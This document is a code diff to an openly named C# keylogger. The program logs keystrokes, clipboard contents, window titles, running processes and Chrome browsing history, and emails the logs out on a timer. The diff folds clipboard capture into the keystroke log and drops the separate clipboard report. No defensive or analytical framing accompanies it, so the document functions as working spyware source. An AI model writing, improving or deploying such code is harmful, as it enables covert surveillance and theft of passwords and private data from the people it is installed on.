@@ -94,15 +94,11 @@ namespace Keylogger
             string pathProcesses = (filepath + @"\processes.txt");
             if (!File.Exists(pathProcesses))
                 using (StreamWriter sw = File.CreateText(pathProcesses)) ;
-            string pathClipboard = (filepath + @"\clipboard.txt");
-            if (!File.Exists(pathClipboard))
-                using (StreamWriter sw = File.CreateText(pathClipboard)) ;
             string pathHistoryChrome = (filepath + @"\ChromeHistory.txt");
             if (!File.Exists(pathHistoryChrome))
                 using (StreamWriter sw = File.CreateText(pathHistoryChrome)) ;
             File.WriteAllText(pathKeys, string.Empty);//
             File.WriteAllText(pathProcesses, string.Empty);
-            File.WriteAllText(pathClipboard, string.Empty);
             File.WriteAllText(pathHistoryChrome, string.Empty);
 
             //Send email every x min
@@ -113,7 +109,7 @@ namespace Keylogger
             var timer = new System.Threading.Timer((ignore) =>
             {
                 if (asd1 == 1)
-                    getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
+                    getActiveProcessesAndSendEmail(pathKeys, pathProcesses, boxes, pathHistoryChrome);
                 asd1 = 1;
             }, null, startTimeSpan, periodTimeSpan);
 
@@ -133,7 +129,8 @@ namespace Keylogger
             {
                 Thread.Sleep(5);
                 getKeys(pathKeys);
-                getClipboard(clipboardContent, pathClipboard);
+                clipboardContent=getClipboard(clipboardContent, pathKeys);
+                //MessageBox.Show(clipboardContent);
             }
         }
 
@@ -148,7 +145,7 @@ namespace Keylogger
                 var proc = Process.GetProcessById((int)procId);
                 //String str = proc.MainModule.ToString().Substring(33);
                 String str = proc.MainWindowTitle;
-                sw.Write("\n" + str + " -> ");
+                sw.Write("\n" + str + " -> \n");
                 lastProc = procId;
             }
         }
@@ -169,7 +166,7 @@ namespace Keylogger
             }
         }
 
-        void getClipboard(string clipboardContent, string pathClipboard)
+        string getClipboard(string clipboardContent, string pathClipboard)
         {
             DataObject retrievedData = (DataObject)Clipboard.GetDataObject();
             if (retrievedData != null)
@@ -180,13 +177,14 @@ namespace Keylogger
                     using (StreamWriter sw = File.AppendText(pathClipboard))
                     {
                         getMainProcess(sw);
-                        sw.Write("\n" + clipboardContent);
+                        sw.Write("\n(copied)" + clipboardContent+"(copied)\n");
                     }
                 }
             }
+            return clipboardContent;
         }
 
-        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)                                               //
+        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome)                                               //
         {
             File.WriteAllText(pathProcesses, string.Empty);
             Process[] processes = Process.GetProcesses();
@@ -201,18 +199,16 @@ namespace Keylogger
                 }
             }
             checkIfChrome(processes, pathHistoryChrome);
-            SendNewMessage(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
+            SendNewMessage(pathKeys, pathProcesses, boxes, pathHistoryChrome);
             File.WriteAllText(pathKeys, string.Empty);
             File.WriteAllText(pathProcesses, string.Empty);
-            File.WriteAllText(pathClipboard, string.Empty);
             File.WriteAllText(pathHistoryChrome, string.Empty);
         }
 
-        void SendNewMessage(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)
+        void SendNewMessage(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome)
         {
             string logKeys = File.ReadAllText(pathKeys);
             string logProcesses = File.ReadAllText(pathProcesses);
-            string logClipboard = File.ReadAllText(pathClipboard);
             string logHistoryChrome = File.ReadAllText(pathHistoryChrome);
 
             DateTime now = DateTime.Now;
@@ -234,8 +230,6 @@ namespace Keylogger
                 emailBody += "\nOpen apps: \n" + logProcesses;
             if (boxes.keys)
                 emailBody += "\nKeys pressed: \n" + logKeys;
-            if (boxes.copied)
-                emailBody += "\nCopied text: \n" + logClipboard;                                //
             if (boxes.history)
                 emailBody += "\nWeb History from Chrome: \n" + logHistoryChrome;
 
